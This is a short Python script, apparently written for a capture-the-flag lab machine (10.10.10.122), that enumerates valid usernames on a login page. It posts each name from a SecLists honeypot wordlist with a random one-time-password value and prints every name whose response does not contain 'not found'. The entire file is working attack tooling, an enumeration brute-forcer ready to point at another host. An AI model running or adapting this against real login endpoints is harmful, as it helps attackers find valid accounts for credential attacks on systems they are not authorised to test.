#!/usr/bin/env python3
# -*- encoding:utf-8 -*-

import random
import requests

debug = True

dictfile = '/usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt'

if debug:
    host = '127.0.0.1:8181'
else:
    host = '10.10.10.122'


endp = '/login.php'
finaluri = 'http://' + host + endp

postparam = {"inputUsername": None, "inputOTP": None}

f = open(dictfile, 'r')

usrname = f.readline().strip()
while usrname != '':
    postparam["inputUsername"] = usrname
    postparam["inputOTP"] = str(random.randint(10000000, 99999999))
    r = requests.post(finaluri, json=postparam)
    if 'not found' in r.text.lower():
        pass
    else:
        print(postparam["inputUsername"])
    usrname = f.readline().strip()

